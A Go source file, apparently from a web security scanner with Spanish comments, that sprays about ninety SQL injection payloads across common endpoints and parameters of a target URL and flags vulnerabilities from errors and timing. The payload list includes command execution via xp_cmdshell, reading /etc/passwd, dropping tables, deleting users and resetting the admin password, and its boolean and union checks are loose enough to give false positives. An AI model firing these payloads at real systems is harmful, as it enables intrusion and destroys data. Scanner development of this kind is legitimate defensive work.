package tests

import (
	"fmt"
	"io"
	"net/url"
	"strings"
	"time"

	"github.com/versaSecurityTest/internal/config"
)

// AdvancedSQLInjectionTest - Test agresivo y completo de SQL Injection
type AdvancedSQLInjectionTest struct{}

// Run ejecuta tests exhaustivos de SQL injection
func (t *AdvancedSQLInjectionTest) Run(targetURL string, client HTTPClient, payloads *config.PayloadConfig) TestResult {
	result := TestResult{
		TestName:    "Advanced SQL Injection Test",
		Status:      "Passed",
		Description: "No se detectaron vulnerabilidades de inyección SQL",
		Severity:    "None",
		Details:     []string{},
		Evidence:    []Evidence{},
	}

	// PAYLOADS EXHAUSTIVOS DE SQL INJECTION
	sqlPayloads := []string{
		// Basic injection
		"'", "''", "\"", "\"\"",
		
		// Boolean-based
		"' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
		"\" OR \"1\"=\"1", "\" OR 1=1--", "\" OR 1=1#",
		"') OR ('1'='1", "\") OR (\"1\"=\"1",
		"' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*",
		
		// Union-based
		"' UNION SELECT null--", "' UNION SELECT null,null--", 
		"' UNION SELECT null,null,null--", "' UNION SELECT 1,2,3--",
		"' UNION ALL SELECT null--", "' UNION ALL SELECT 1,2,3--",
		"' UNION SELECT @@version--", "' UNION SELECT user()--",
		"' UNION SELECT database()--", "' UNION SELECT table_name FROM information_schema.tables--",
		
		// Error-based
		"' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT version()),0x3a,FLOOR(rand()*2))) --",
		"' AND ExtractValue(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
		"' AND UpdateXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
		"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
		
		// Time-based
		"'; WAITFOR DELAY '00:00:05'--", "'; SELECT pg_sleep(5)--",
		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "' OR SLEEP(5)--",
		"'; exec master..xp_cmdshell 'ping -n 5 127.0.0.1'--",
		
		// Blind injection
		"' AND SUBSTRING(@@version,1,1)='5'--", "' AND ASCII(SUBSTRING(@@version,1,1))>52--",
		"' AND (SELECT LENGTH(database()))>0--", "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
		
		// Comment variations
		"'--", "'#", "'/*", "'%00", "';--", "';#", "';/*",
		
		// WAF/Filter bypass techniques
		"'/**/OR/**/1=1--", "'/*!50000OR*/1=1--", "'%2527%2520OR%25201=1--",
		"' %4fR 1=1--", "' /*!44444OR*/ 1=1--", "'/**//*!50000OR*//**/1/**/=/**/1--",
		"'UNI/**/ON SEL/**/ECT", "'UNI%6fN SEL%45CT", 
		
		// Encoding bypass
		"%27 OR %271%27=%271", "%22 OR %221%22=%221", 
		"&#39; OR &#39;1&#39;=&#39;1", "\\' OR \\'1\\'=\\'1",
		
		// Double encoding
		"%2527%2520OR%25201=1--", "%252727%252520OR%2525201=1--",
		
		// Unicode bypass
		"'; OR '1'='1", "＇ OR ＇1＇=＇1", "？ OR １=１",
		
		// MSSQL specific
		"'; exec xp_cmdshell('dir')--", "'; OPENROWSET('SQLOLEDB','';'sa';'','SELECT 1')--",
		"'; INSERT INTO OPENROWSET('Microsoft.Jet.OLEDB.4.0',';','SELECT * FROM [C:\\test.xls]')--",
		
		// MySQL specific
		"' INTO OUTFILE '/tmp/test'--", "' LOAD_FILE('/etc/passwd')--",
		"' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),VERSION(),CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97))x FROM information_schema.tables GROUP BY x)--",
		
		// PostgreSQL specific
		"'; COPY (SELECT '') TO '/tmp/test'--", "' AND 1=1; DROP TABLE test--",
		"' UNION SELECT version(),null--", "' AND (SELECT substring(version(),1,1))='P'--",
		
		// Oracle specific
		"' UNION SELECT null FROM dual--", "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('oracle-server')--",
		"' UNION SELECT banner FROM v$version--",
		
		// Stacked queries
		"'; INSERT INTO users VALUES ('admin','admin')--",
		"'; UPDATE users SET password='admin' WHERE username='admin'--",
		"'; DELETE FROM users WHERE username='test'--",
		
		// Function-based
		"' AND 1=CONVERT(int,(SELECT @@version))--",
		"' AND 1=CAST((SELECT @@version) AS int)--",
		"' AND 1=(SELECT COUNT(*) FROM sysobjects)--",
	}

	// PARÁMETROS COMUNES A PROBAR
	commonParams := []string{
		"id", "user", "username", "userid", "user_id", "email", "search", "q", "query",
		"name", "page", "category", "cat", "item", "product", "news", "article",
		"file", "path", "dir", "folder", "doc", "document", "key", "token",
		"action", "cmd", "command", "exec", "function", "method", "class",
		"order", "sort", "by", "limit", "offset", "start", "end", "count",
	}

	// ENDPOINTS COMUNES A PROBAR
	commonEndpoints := []string{
		"/login", "/admin", "/search", "/user", "/profile", "/product", "/category",
		"/news", "/article", "/download", "/upload", "/api/user", "/api/search",
		"/api/login", "/api/admin", "/admin/login", "/admin/user", "/panel",
		"/dashboard", "/manager", "/control", "/system", "/config", "/settings",
	}

	var vulnerabilitiesFound int
	var totalTests int

	for _, endpoint := range commonEndpoints {
		for _, param := range commonParams {
			for _, payload := range sqlPayloads {
				totalTests++
				
				// Test en parámetros GET
				testURL := fmt.Sprintf("%s%s?%s=%s", targetURL, endpoint, param, url.QueryEscape(payload))
				
				startTime := time.Now()
				resp, err := client.Get(testURL)
				responseTime := time.Since(startTime)
				
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				// Leer respuesta
				body, err := io.ReadAll(resp.Body)
				if err != nil {
					continue
				}
				responseText := string(body)
				// ANÁLISIS EXHAUSTIVO DE LA RESPUESTA
				vulnerability := t.analyzeResponse(resp.StatusCode, responseText, responseTime, payload)
				
				if vulnerability.IsVulnerable {
					vulnerabilitiesFound++
					
					result.Evidence = append(result.Evidence, Evidence{
						Type:        "SQL Injection",
						URL:         testURL,
						Payload:     payload,
						StatusCode:  resp.StatusCode,
						Response:    vulnerability.Evidence,
						Description: vulnerability.Description,
						Severity:    vulnerability.Severity,
					})

					result.Details = append(result.Details,
						fmt.Sprintf("VULNERABLE: %s?%s=%s - %s", endpoint, param, payload, vulnerability.Description))
				}

				// Limite de seguridad para no saturar el servidor
				if totalTests%100 == 0 {
					time.Sleep(100 * time.Millisecond)
				}
			}
		}
	}

	// Evaluar resultados finales
	if vulnerabilitiesFound > 0 {
		result.Status = "Failed"
		result.Severity = "Critical"
		result.Description = fmt.Sprintf("CRÍTICO: Se detectaron %d vulnerabilidades de SQL injection en %d tests realizados", vulnerabilitiesFound, totalTests)
	} else {
		result.Details = append(result.Details, fmt.Sprintf("Se realizaron %d tests exhaustivos sin detectar vulnerabilidades SQL", totalTests))
	}

	return result
}

// SQLVulnerability estructura para análisis de vulnerabilidades
type SQLVulnerability struct {
	IsVulnerable bool
	Description  string
	Evidence     string
	Severity     string
}

// analyzeResponse analiza la respuesta en busca de indicadores de SQL injection
func (t *AdvancedSQLInjectionTest) analyzeResponse(statusCode int, responseText string, responseTime time.Duration, payload string) SQLVulnerability {
	responseLower := strings.ToLower(responseText)
	
	// PATRONES DE ERROR SQL
	sqlErrorPatterns := []struct {
		pattern  string
		database string
		severity string
	}{
		// MySQL
		{"you have an error in your sql syntax", "MySQL", "Critical"},
		{"warning: mysql_", "MySQL", "High"},
		{"mysql_fetch_array()", "MySQL", "High"},
		{"mysql_num_rows()", "MySQL", "High"},
		{"mysql error", "MySQL", "High"},
		{"supplied argument is not a valid mysql", "MySQL", "High"},
		
		// MSSQL
		{"microsoft ole db provider for sql server", "MSSQL", "Critical"},
		{"unclosed quotation mark after the character string", "MSSQL", "Critical"},
		{"incorrect syntax near", "MSSQL", "Critical"},
		{"'80040e14'", "MSSQL", "High"},
		{"mssql_query()", "MSSQL", "High"},
		
		// Oracle
		{"ora-01756", "Oracle", "Critical"},
		{"ora-00933", "Oracle", "Critical"},
		{"ora-00921", "Oracle", "Critical"},
		{"oracle error", "Oracle", "High"},
		{"oracle driver", "Oracle", "Medium"},
		
		// PostgreSQL
		{"invalid input syntax for type", "PostgreSQL", "Critical"},
		{"unterminated quoted string", "PostgreSQL", "Critical"},
		{"pg_query() expects", "PostgreSQL", "High"},
		{"postgresql error", "PostgreSQL", "High"},
		
		// Generic
		{"sql syntax", "Generic", "High"},
		{"database error", "Generic", "Medium"},
		{"query failed", "Generic", "Medium"},
		{"invalid query", "Generic", "Medium"},
		{"syntax error", "Generic", "Medium"},
	}

	// Buscar patrones de error
	for _, pattern := range sqlErrorPatterns {
		if strings.Contains(responseLower, pattern.pattern) {
			return SQLVulnerability{
				IsVulnerable: true,
				Description:  fmt.Sprintf("Error de base de datos %s detectado", pattern.database),
				Evidence:     fmt.Sprintf("Patrón encontrado: '%s' en respuesta con payload '%s'", pattern.pattern, payload),
				Severity:     pattern.severity,
			}
		}
	}

	// ANÁLISIS POR STATUS CODE
	if statusCode == 500 {
		// Buscar más detalles en error 500
		if strings.Contains(responseLower, "exception") || strings.Contains(responseLower, "error") {
			return SQLVulnerability{
				IsVulnerable: true,
				Description:  "Error 500 con información de excepción - posible SQL injection",
				Evidence:     fmt.Sprintf("Status 500 con payload '%s' y stack trace visible", payload),
				Severity:     "High",
			}
		}
	}

	// ANÁLISIS DE TIMING ATTACKS
	if responseTime > 5*time.Second && (strings.Contains(payload, "SLEEP") || strings.Contains(payload, "WAITFOR") || strings.Contains(payload, "pg_sleep")) {
		return SQLVulnerability{
			IsVulnerable: true,
			Description:  "Time-based SQL injection detectada",
			Evidence:     fmt.Sprintf("Tiempo de respuesta anómalo: %v con payload temporal '%s'", responseTime, payload),
			Severity:     "Critical",
		}
	}

	// ANÁLISIS DE CONTENIDO ESPECÍFICO
	if strings.Contains(responseLower, "mysql") && strings.Contains(payload, "version") {
		return SQLVulnerability{
			IsVulnerable: true,
			Description:  "Información de versión MySQL expuesta",
			Evidence:     fmt.Sprintf("Referencia a MySQL en respuesta con payload '%s'", payload),
			Severity:     "Medium",
		}
	}

	// DETECCIÓN DE UNION-BASED INJECTION
	if strings.Contains(payload, "UNION") && statusCode == 200 {
		// Buscar patrones que indiquen éxito de UNION
		unionPatterns := []string{"null", "1", "2", "3", "admin", "root", "test"}
		for _, pattern := range unionPatterns {
			if strings.Contains(responseLower, pattern) && len(responseText) > 100 {
				return SQLVulnerability{
					IsVulnerable: true,
					Description:  "Posible UNION-based SQL injection",
					Evidence:     fmt.Sprintf("UNION query aparentemente exitosa con payload '%s'", payload),
					Severity:     "High",
				}
			}
		}
	}

	// ANÁLISIS DE BOOLEAN-BASED INJECTION
	if strings.Contains(payload, "1=1") || strings.Contains(payload, "'1'='1") {
		// En Boolean-based, buscamos diferencias en el comportamiento
		if statusCode == 200 && len(responseText) > 50 {
			return SQLVulnerability{
				IsVulnerable: true,
				Description:  "Posible Boolean-based SQL injection",
				Evidence:     fmt.Sprintf("Comportamiento diferente con payload lógico '%s'", payload),
				Severity:     "High",
			}
		}
	}

	return SQLVulnerability{IsVulnerable: false}
}
